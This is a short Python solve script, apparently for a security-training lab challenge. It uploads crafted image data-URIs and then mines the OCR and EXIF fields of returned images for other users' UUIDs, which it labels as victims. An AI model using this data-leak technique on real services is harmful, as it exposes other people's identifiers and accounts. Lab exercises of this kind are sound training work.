import requests, re
BASE = "https://chl-f4e46c02-efed-4276-8edf-ffade8aa3cf6-mis-viajes-v2.softwareseguro.com.ar"
UID  = "ea42cd39-001b-4fb5-a509-449322674687"
for name in ["d1","d2"]:
    uri = open(name+"_datauri.txt").read().strip()
    r = requests.post(f"{BASE}/upload", json={"image":uri,"description":"D_"+name,"user_id":UID})
    print(f"{name} -> {r.status_code}")
data = requests.get(f"{BASE}/images/{UID}").json()
for img in data:
    if str(img.get("description","")).startswith("D_"):
        print(f"{img['description']}: ocr={img.get('summary_ocr')!r}")
seen=set()
for img in data:
    for fld in ("summary_ocr","make","model","datetime"):
        for m in re.findall(r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}", str(img.get(fld,""))):
            if m != UID and m not in seen:
                seen.add(m); print(f"  >>> {fld} id={img['id']}: {m}")
if seen: print("VICTIM uuid:", seen)
